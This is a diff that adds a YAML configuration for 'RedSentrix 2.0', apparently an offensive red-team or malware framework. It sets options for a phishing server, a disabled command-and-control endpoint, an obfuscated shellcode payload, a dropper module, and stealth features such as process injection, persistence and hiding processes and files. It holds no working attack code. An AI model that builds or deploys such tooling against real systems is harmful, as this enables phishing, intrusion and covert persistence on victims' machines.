@@ -1,0 +1,41 @@
+# RedSentrix 2.0 Configuration
+
+phishing:
+  port: 8080
+  target_url: "https://example.com"
+  cert_path: "build/phishing/cert.pem"
+  key_path: "build/phishing/key.pem"
+  domains:
+    - "example.com"
+    - "*.example.com"
+
+c2:
+  enabled: false
+  url: "https://c2.example.com"
+  key: ""
+  interval: 60
+  encryption: true
+
+payload:
+  stage: 1
+  obfuscate: true
+  encrypt: true
+  method: "shellcode"
+  compression: true
+
+modules:
+  - "phishing.embedder"
+  - "dropper.dropper"
+
+stealth:
+  evasion: true
+  injection_method: 2  # 1=DLL, 2=Shellcode, 3=Reflective, 4=ProcessHollowing
+  persistence: true
+  hide_process: true
+  hide_files: true
+
+logging:
+  level: "info"
+  file: "logs/redsentrix.log"
+  encrypt: false
+
